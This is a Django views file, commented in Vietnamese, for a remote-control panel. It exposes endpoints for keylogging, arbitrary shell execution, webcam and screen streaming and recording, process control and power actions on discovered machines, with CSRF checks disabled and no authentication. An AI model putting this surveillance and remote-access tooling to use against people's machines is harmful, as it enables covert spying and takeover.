"""
Remote Control Views - Django API Endpoints với Persistent Connection
Sử dụng Session-based connection management và UDP Discovery
"""
from django.shortcuts import render, redirect
from django.http import JsonResponse, HttpResponse
from django.views.decorators.http import require_http_methods
from django.views.decorators.csrf import csrf_exempt
from django.core.files.base import ContentFile
import json
import logging
import time
from .models import WebcamRecording
import os

# Import Persistent Client và UDP Discovery
from .socket_client_persistent import PersistentRemoteClient
from .udp_discovery import UDPDiscoveryClient

logger = logging.getLogger(__name__)

def _get_client(request):
    """
    Helper: Lấy PersistentRemoteClient từ session
    """
    session_id = request.session.session_key
    if not session_id:
        request.session.create()
        session_id = request.session.session_key
    
    server_ip = request.session.get('target_server_ip')
    
    if not server_ip:
        logger.warning("No target server IP in session")
        return None
    
    return PersistentRemoteClient.get_or_create(
        session_id=session_id,
        host=server_ip,
        port=5656,
        timeout=60
    )

def cleanup_missing_recordings():
    """Helper: Xóa record trong DB nếu file thực tế không tồn tại"""
    try:
        from .models import WebcamRecording, ScreenRecording
        
        for rec in WebcamRecording.objects.all():
            if not rec.file_path or not os.path.exists(rec.file_path.path):
                rec.delete()
                
        for rec in ScreenRecording.objects.all():
            if not rec.file_path or not os.path.exists(rec.file_path.path):
                rec.delete()
    except Exception:
        pass

def index(request):
    return render(request, 'remote_control/index.html')


@require_http_methods(["GET"])
def server_info(request):
    start_time = getattr(PersistentRemoteClient, '_server_start_time', 0)
    return JsonResponse({"start_time": start_time})


# ==================== APPLICATION PAGES ====================

def applications_page(request):
    return render(request, 'remote_control/applications.html')


# ==================== PROCESS PAGES ====================

def processes_page(request):
    return render(request, 'remote_control/processes.html')


# ==================== OTHER FEATURE PAGES ====================

def screenshot_page(request):
    return render(request, 'remote_control/screenshot.html')

def keylogger_page(request):
    return render(request, 'remote_control/keylogger.html')

def webcam_page(request):
    return render(request, 'remote_control/webcam.html')

def screen_page(request):
    return render(request, 'remote_control/screen.html')

def power_page(request):
    return render(request, 'remote_control/power.html')

def shell_page(request):
    return render(request, 'remote_control/shell.html')

# ==================== UDP DISCOVERY API ====================

@require_http_methods(["GET"])
def discover_servers(request):
    try:
        discovery_client = UDPDiscoveryClient(timeout=3.0)
        result = discovery_client.discover_with_details()
        return JsonResponse(result)
    
    except Exception as e:
        logger.error(f"Discovery error: {str(e)}")
        return JsonResponse({
            "success": False,
            "servers": [],
            "count": 0,
            "message": f"Discovery failed: {str(e)}"
        }, status=500)


# ==================== PERSISTENT CONNECTION APIs ====================

@csrf_exempt
@require_http_methods(["POST"])
def connect_server(request):
    try:
        data = json.loads(request.body)
        server_ip = data.get('server_ip')
        
        if not server_ip:
            return JsonResponse({"success": False, "message": "Server IP is required"}, status=400)
        
        request.session['target_server_ip'] = server_ip
        
        client = _get_client(request)
        
        if client and client.connected:
            client.shell_reset()

            return JsonResponse({
                "success": True,
                "message": f"Connected to {server_ip}",
                "server_ip": server_ip
            })
        else:
            return JsonResponse({"success": False, "message": "Failed to connect to server"}, status=500)
    
    except Exception as e:
        logger.error(f"Connect error: {str(e)}")
        return JsonResponse({"success": False, "message": str(e)}, status=500)


@csrf_exempt
@require_http_methods(["POST"])
def disconnect_server(request):
    """
    API: Ngắt kết nối - CẬP NHẬT: Chặn nếu đang bận
    """
    try:
        client = _get_client(request)
        if client and client.connected:
            
            # --- 1. KIỂM TRA TRẠNG THÁI TRƯỚC ---
            try:
                # Lấy trạng thái Webcam và Screen
                w_status = client.webcam_status()
                s_status = client.screen_status()
                
                is_busy = False
                busy_msg = []
                
                # Check Webcam
                if w_status.get('camera_on') or w_status.get('recording'):
                    is_busy = True
                    busy_msg.append("Webcam")
                    
                # Check Screen
                if s_status.get('stream_on') or s_status.get('recording'):
                    is_busy = True
                    busy_msg.append("Screen Recorder")
                
                # NẾU BẬN -> TỪ CHỐI DISCONNECT
                if is_busy:
                    msg = " & ".join(busy_msg)
                    return JsonResponse({
                        "success": False, 
                        "message": f"⚠️ KHÔNG THỂ NGẮT KẾT NỐI!\n\n{msg} đang hoạt động.\nVui lòng tắt chức năng ghi hình/webcam trước."
                    })
            except Exception:
                # Nếu lỗi khi check (vd server chết), bỏ qua và cho phép disconnect
                pass

            # --- 2. NẾU KHÔNG BẬN -> TIẾN HÀNH DISCONNECT ---
            # Dọn dẹp shell
            try: client.shell_reset()
            except: pass

        # Clean session socket
        session_id = request.session.session_key
        if session_id:
            PersistentRemoteClient.disconnect_session(session_id)
        
        # Xóa IP khỏi session
        if 'target_server_ip' in request.session:
            del request.session['target_server_ip']
        
        return JsonResponse({"success": True, "message": "Disconnected successfully"})
    
    except Exception as e:
        logger.error(f"Disconnect error: {str(e)}")
        return JsonResponse({"success": False, "message": str(e)}, status=500)


# ==================== EXISTING APIs ====================

@require_http_methods(["GET"])
def get_keylog_status(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("KEYLOG", "STATUS"))


@require_http_methods(["GET"])
def get_processes(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("PROCESS", "XEM"))


@csrf_exempt
@require_http_methods(["POST"])
def kill_process(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        data = json.loads(request.body)
        return JsonResponse(client.send_command("PROCESS", "KILL", data.get('id')))
    except Exception as e: return JsonResponse({"status": "error", "message": str(e)})


@csrf_exempt
@require_http_methods(["POST"])
def start_process(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        data = json.loads(request.body)
        return JsonResponse(client.send_command("PROCESS", "START", data.get('name')))
    except Exception as e: return JsonResponse({"status": "error", "message": str(e)})


@require_http_methods(["GET"])
def get_apps(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("APPLICATION", "XEM"))


@csrf_exempt
@require_http_methods(["POST"])
def kill_app(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        data = json.loads(request.body)
        return JsonResponse(client.send_command("APPLICATION", "KILL", data.get('id')))
    except Exception as e: return JsonResponse({"status": "error", "message": str(e)})


@require_http_methods(["GET"])
def take_screenshot(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("TAKEPIC"))


@require_http_methods(["GET"])
def get_keylog(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("KEYLOG", "PRINT"))


@csrf_exempt
@require_http_methods(["POST"])
def hook_keylog(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        data = json.loads(request.body)
        return JsonResponse(client.send_command("KEYLOG", data.get('action')))
    except Exception as e: return JsonResponse({"status": "error", "message": str(e)})


@csrf_exempt
@require_http_methods(["POST"])
def clear_keylog(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    return JsonResponse(client.send_command("KEYLOG", "CLEAR"))


@csrf_exempt
@require_http_methods(["POST"])
def power_action(request):
    client = _get_client(request)
    if not client: return JsonResponse({"status": "error", "message": "Not connected"}, status=400)
    try:
        data = json.loads(request.body)
        return JsonResponse(client.send_command(data.get('action')))
    except Exception as e: return JsonResponse({"status": "error", "message": str(e)})

# ==================== CMD APIs ====================
@csrf_exempt
@require_http_methods(["POST"])
def execute_shell_command(request):
    client = _get_client(request)
    if not client:
        return JsonResponse({"status": "disconnected", "message": "Not connected to server"}, status=200)
    try:
        data = json.loads(request.body)
        return JsonResponse(client.send_command("CMD", "EXEC", data.get('command')))
    except Exception as e:
        return JsonResponse({"status": "error", "message": str(e)}, status=500)

# ==================== WEBCAM APIs ====================

@csrf_exempt
@require_http_methods(["POST"])
def webcam_on(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    try: return JsonResponse(client.webcam_on())
    except Exception as e: return JsonResponse({"success": False, "message": str(e)}, status=500)


@csrf_exempt
@require_http_methods(["POST"])
def webcam_off(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    try: return JsonResponse(client.webcam_off())
    except Exception as e: return JsonResponse({"success": False, "message": str(e)}, status=500)


@require_http_methods(["GET"])
def webcam_stream(request):
    if not request.session.get('target_server_ip'): return HttpResponse(status=204)
    client = _get_client(request)
    if not client: return HttpResponse("Not connected", status=400)
    try:
        frame_data = client.webcam_get_frame()
        if frame_data: return HttpResponse(frame_data, content_type='image/jpeg')
        else: return HttpResponse("No frame", status=404)
    except Exception as e: return HttpResponse(f"Error: {str(e)}", status=500)


@csrf_exempt
@require_http_methods(["POST"])
def webcam_start_recording(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    try:
        result = client.webcam_start_recording()
        
        # --- CẬP NHẬT: Lưu thời gian bắt đầu vào Session ---
        if result.get("success"):
            request.session['webcam_rec_start_time'] = time.time()
        # ---------------------------------------------------
        
        return JsonResponse(result)
    except Exception as e: return JsonResponse({"success": False, "message": str(e)}, status=500)


@csrf_exempt
@require_http_methods(["POST"])
def webcam_stop_recording(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    
    try:
        result = client.webcam_stop_recording()
        if not result.get('success'): return JsonResponse(result)
        
        from .models import WebcamRecording
        
        filename = result.get('filename', 'unknown.avi')
        video_data = result.get('video_data', b'')
        file_size = result.get('file_size', 0)
        
        # --- CẬP NHẬT: Tính duration bằng Python ---
        duration_sec = 0
        start_time = request.session.pop('webcam_rec_start_time', None)
        if start_time:
            duration_sec = int(time.time() - start_time)
        # -------------------------------------------

        if not video_data:
            return JsonResponse({"success": False, "message": "No video data received"})
        
        # Lưu vào DB (Lưu số giây vào duration)
        server_ip = request.session.get('target_server_ip', 'unknown')
        recording = WebcamRecording(
            server_ip=server_ip,
            filename=filename,
            file_size=file_size,
            duration=duration_sec # Lưu số giây tính được
        )
        
        recording.file_path.save(filename, ContentFile(video_data), save=True)
        
        # Format duration để hiển thị ngay lập tức (không cần reload list)
        m, s = divmod(duration_sec, 60)
        h, m = divmod(m, 60)
        formatted_duration = "{:02d}:{:02d}:{:02d}".format(h, m, s)

        return JsonResponse({
            "success": True,
            "message": "Recording saved successfully",
            "recording_id": recording.id,
            "filename": filename,
            "file_size": recording.get_file_size_display(),
            "duration": formatted_duration # Trả về chuỗi đẹp cho JS
        })
    
    except Exception as e:
        logger.error(f"Stop recording error: {str(e)}")
        return JsonResponse({"success": False, "message": str(e)}, status=500)


@require_http_methods(["GET"])
def webcam_status(request):
    client = _get_client(request)
    if not client: return JsonResponse({"camera_on": False, "recording": False})
    try: return JsonResponse(client.webcam_status())
    except: return JsonResponse({"camera_on": False, "recording": False})


@require_http_methods(["GET"])
def webcam_list(request):
    cleanup_missing_recordings()
    try:
        from .models import WebcamRecording
        server_ip = request.session.get('target_server_ip')
        if server_ip: recordings = WebcamRecording.objects.filter(server_ip=server_ip)
        else: recordings = WebcamRecording.objects.all()
        
        recordings_data = []
        for rec in recordings:
            # Logic format cũ của bạn vẫn hoạt động tốt nếu rec.duration là số giây
            duration_str = str(rec.duration).lower().replace('s', '')
            formatted_duration = "00:00:00"
            if duration_str.isdigit():
                seconds = int(duration_str)
                m, s = divmod(seconds, 60)
                h, m = divmod(m, 60)
                formatted_duration = "{:02d}:{:02d}:{:02d}".format(h, m, s)

            recordings_data.append({
                "id": rec.id,
                "filename": rec.filename,
                "file_url": rec.file_path.url if rec.file_path else "",
                "recorded_at": rec.recorded_at.strftime("%Y-%m-%d %H:%M:%S"),
                "file_size": rec.get_file_size_display(),
                "duration": formatted_duration
            })
        return JsonResponse({"success": True, "recordings": recordings_data})
    except Exception as e: return JsonResponse({"success": False, "recordings": []}, status=500)


@csrf_exempt
@require_http_methods(["DELETE"])
def webcam_delete(request, recording_id):
    try:
        from .models import WebcamRecording
        recording = WebcamRecording.objects.get(id=recording_id)
        if recording.file_path: recording.file_path.delete()
        recording.delete()
        return JsonResponse({"success": True, "message": "Recording deleted"})
    except WebcamRecording.DoesNotExist: return JsonResponse({"success": False, "message": "Not found"}, status=404)
    except Exception as e: return JsonResponse({"success": False, "message": str(e)}, status=500)

# ==================== SCREEN RECORDING APIs ====================

@require_http_methods(["GET"])
def screen_list(request):
    cleanup_missing_recordings()
    try:
        from .models import ScreenRecording
        recordings = ScreenRecording.objects.all().order_by('-recorded_at')
        data = []
        for rec in recordings:
            duration_str = str(rec.duration)
            formatted_duration = "00:00:00"
            if duration_str.isdigit():
                seconds = int(duration_str)
                m, s = divmod(seconds, 60)
                h, m = divmod(m, 60)
                formatted_duration = "{:02d}:{:02d}:{:02d}".format(h, m, s)

            data.append({
                "id": rec.id,
                "filename": rec.filename,
                "file_url": rec.file_path.url if rec.file_path else "",
                "recorded_at": rec.recorded_at.strftime("%Y-%m-%d %H:%M:%S"),
                "file_size": rec.get_file_size_display(),
                "duration": formatted_duration
            })
        return JsonResponse({"success": True, "recordings": data})
    except Exception as e: return JsonResponse({"success": False, "message": str(e)})
    
@csrf_exempt
@require_http_methods(["POST"])
def screen_stream_on(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.screen_start_stream())

@csrf_exempt
@require_http_methods(["POST"])
def screen_stream_off(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.screen_stop_stream())

@require_http_methods(["GET"])
def screen_stream_frame(request):
    client = _get_client(request)
    if not client: return HttpResponse(status=204)
    frame_data = client.screen_get_frame()
    if frame_data: return HttpResponse(frame_data, content_type='image/jpeg')
    return HttpResponse(status=204)

@csrf_exempt
@require_http_methods(["POST"])
def screen_start_rec(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    return JsonResponse(client.screen_start_recording())

@csrf_exempt
@require_http_methods(["POST"])
def screen_stop_rec(request):
    client = _get_client(request)
    if not client: return JsonResponse({"success": False, "message": "Not connected"}, status=400)
    try:
        result = client.screen_stop_recording()
        if not result.get('success'): return JsonResponse(result)
        
        from .models import ScreenRecording
        from django.core.files.base import ContentFile
        
        filename = result.get('filename', 'unknown.avi')
        final_filename = "SCREEN_" + filename 
        
        rec = ScreenRecording(
            server_ip=request.session.get('target_server_ip', 'unknown'),
            filename=final_filename,
            file_size=result.get('file_size'),
            duration=result.get('duration')
        )
        rec.file_path.save(final_filename, ContentFile(result.get('video_data')), save=True)
        
        return JsonResponse({
            "success": True, 
            "message": "Saved successfully",
            "filename": final_filename,
            "file_size": rec.get_file_size_display(),
            "duration": result.get('duration')
        })
    except Exception as e: return JsonResponse({"success": False, "message": str(e)}, status=500)

@require_http_methods(["GET"])
def screen_get_status(request):
    client = _get_client(request)
    if not client: return JsonResponse({"stream_on": False, "recording": False})
    return JsonResponse(client.screen_status())

@csrf_exempt
@require_http_methods(["DELETE"])
def screen_delete(request, recording_id):
    try:
        from .models import ScreenRecording
        recording = ScreenRecording.objects.get(id=recording_id)
        if recording.file_path: recording.file_path.delete()
        recording.delete()
        return JsonResponse({"success": True, "message": "Recording deleted"})
    except ScreenRecording.DoesNotExist: return JsonResponse({"success": False, "message": "Not found"}, status=404)
    except Exception as e: return JsonResponse({"success": False, "message": str(e)}, status=500)